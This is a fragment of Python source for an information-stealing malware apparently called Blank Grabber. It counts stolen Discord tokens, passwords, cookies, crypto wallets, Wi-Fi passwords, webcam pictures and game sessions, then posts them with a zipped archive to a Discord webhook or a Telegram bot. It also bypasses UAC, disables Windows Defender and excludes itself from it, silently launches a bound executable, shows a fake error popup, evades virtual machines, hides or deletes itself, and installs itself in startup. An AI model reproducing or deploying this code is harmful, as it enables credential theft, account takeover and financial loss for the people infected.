        collection = {'Discord Accounts': self.DiscordTokensCount, 'Passwords': self.PasswordsCount, 'Cookies': len(self.Cookies), 'History': self.HistoryCount, 'Autofills': self.AutofillCount, 'Roblox Cookies': self.RobloxCookiesCount, 'Telegram Sessions': self.TelegramSessionsCount, 'Common Files': self.CommonFilesCount, 'Wallets': self.WalletsCount, 'Wifi Passwords': self.WifiPasswordsCount, 'Webcam': self.WebcamPicturesCount, 'Minecraft Sessions': self.MinecraftSessions, 'Epic Session': 'Yes' if self.EpicStolen else 'No', 'Steam Session': 'Yes' if self.SteamStolen else 'No', 'Uplay Session': 'Yes' if self.UplayStolen else 'No', 'Battle.Net Session': 'Yes' if self.BattleNetStolen else 'No', 'Growtopia Session': 'Yes' if self.GrowtopiaStolen else 'No', 'Screenshot': 'Yes' if self.ScreenshotTaken else 'No', 'System Info': 'Yes' if self.SystemInfoStolen else 'No'}
        grabbedInfo = '\n'.join([key + ' : ' + str(value) for (key, value) in collection.items()])
        match Settings.C2[0]:
            case 0:
                image_url = 'https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png'
                payload = {'content': '||@everyone||' if Settings.PingMe else 'password zip:skid', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/f4kedre4lity/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/f4kedre4lity/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                    url = self.UploadToExternalService(self.ArchivePath, filename)
                    if url is None:
                        raise Exception('Failed to upload to external service')
                else:
                    url = None
                fields = dict()
                if url:
                    payload['content'] += ' | Archive : %s' % url
                else:
                    fields['file'] = (filename, open(self.ArchivePath, 'rb').read())
                fields['payload_json'] = json.dumps(payload).encode()
                http.request('POST', Settings.C2[1], fields=fields)
            case 1:
                payload = {'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40:
                    url = self.UploadToExternalService(self.ArchivePath, filename)
                    if url is None:
                        raise Exception('Failed to upload to external service')
                else:
                    url = None
                fields = dict()
                if url:
                    payload['text'] = payload['caption'] + '\n\nArchive : %s' % url
                    method = 'sendMessage'
                else:
                    fields['document'] = (filename, open(self.ArchivePath, 'rb').read())
                    method = 'sendDocument'
                (token, chat_id) = Settings.C2[1].split('$')
                fields.update(payload)
                fields.update({'chat_id': chat_id})
                http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)
if os.name == 'nt':
    Logger.info('Process started')
    if Settings.HideConsole:
        Syscalls.HideConsole()
    if not Utility.IsAdmin():
        Logger.warning('Admin privileges not available')
        if Utility.GetSelf()[1]:
            if not '--nouacbypass' in sys.argv and Settings.UacBypass:
                Logger.info('Trying to bypass UAC (Application will restart)')
                if Utility.UACbypass():
                    os._exit(0)
                else:
                    Logger.warning('Failed to bypass UAC')
                    if not Utility.IsInStartup(sys.executable):
                        logger.info('Showing UAC prompt')
                        if Utility.UACPrompt(sys.executable):
                            os._exit(0)
            if not Utility.IsInStartup() and (not Settings.UacBypass):
                Logger.info('Showing UAC prompt to user (Application will restart)')
                if Utility.UACPrompt(sys.executable):
                    os._exit(0)
    Logger.info('Trying to create mutex')
    if not Syscalls.CreateMutex(Settings.Mutex):
        Logger.info('Mutex already exists, exiting')
        os._exit(0)
    if Utility.GetSelf()[1]:
        Logger.info('Trying to exclude the file from Windows defender')
        Utility.ExcludeFromDefender()
    Logger.info('Trying to disable defender')
    Utility.DisableDefender()
    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.blank'))):
        try:
            Logger.info('Trying to extract bound file')
            if os.path.isfile((boundFileDst := os.path.join(os.getenv('temp'), 'bound.exe'))):
                Logger.info('Old bound file found, removing it')
                os.remove(boundFileDst)
            with open(boundFileSrc, 'rb') as file:
                content = file.read()
            decrypted = zlib.decompress(content[::-1])
            with open(boundFileDst, 'wb') as file:
                file.write(decrypted)
            del content, decrypted
            Logger.info('Trying to exclude bound file from defender')
            Utility.ExcludeFromDefender(boundFileDst)
            Logger.info('Starting bound file')
            subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception as e:
            Logger.error(e)
    if Utility.GetSelf()[1] and Settings.FakeError[0] and (not Utility.IsInStartup()):
        try:
            Logger.info('Showing fake error popup')
            title = Settings.FakeError[1][0].replace('"', '\\x22').replace("'", '\\x22')
            message = Settings.FakeError[1][1].replace('"', '\\x22').replace("'", '\\x22')
            icon = int(Settings.FakeError[1][2])
            cmd = 'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'{}\', 0, \'{}\', {}+16);close()"'.format(message, title, Settings.FakeError[1][2])
            subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception as e:
            Logger.error(e)
    if not Settings.Vmprotect or not VmProtect.isVM():
        if Utility.GetSelf()[1]:
            if Settings.Melt and (not Utility.IsInStartup()):
                Logger.info('Hiding the file')
                Utility.HideSelf()
        elif Settings.Melt:
            Logger.info('Deleting the file')
            Utility.DeleteSelf()
        try:
            if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):
                Logger.info('Trying to put the file in startup')
                path = Utility.PutInStartup()
                if path is not None:
                    Logger.info('Excluding the file from Windows defender in startup')
                    Utility.ExcludeFromDefender(path)
        except Exception:
            Logger.error('Failed to put the file in startup')
        while True:
            try:
                Logger.info('Checking internet connection')
                if Utility.IsConnectedToInternet():
                    Logger.info('Internet connection available, starting stealer (things will be running in parallel)')
                    BlankGrabber()
                    Logger.info('Stealer finished its work')
                    break
                else:
                    Logger.info('Internet connection not found, retrying in 10 seconds')
                    time.sleep(10)
            except Exception as e:
                if isinstance(e, KeyboardInterrupt):
                    os._exit(1)
                Logger.critical(e, exc_info=True)
                Logger.info('There was an error, retrying after 10 minutes')
                time.sleep(600)
        if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):
            Logger.info('Deleting the file')
            Utility.DeleteSelf()
        Logger.info('Process ended')
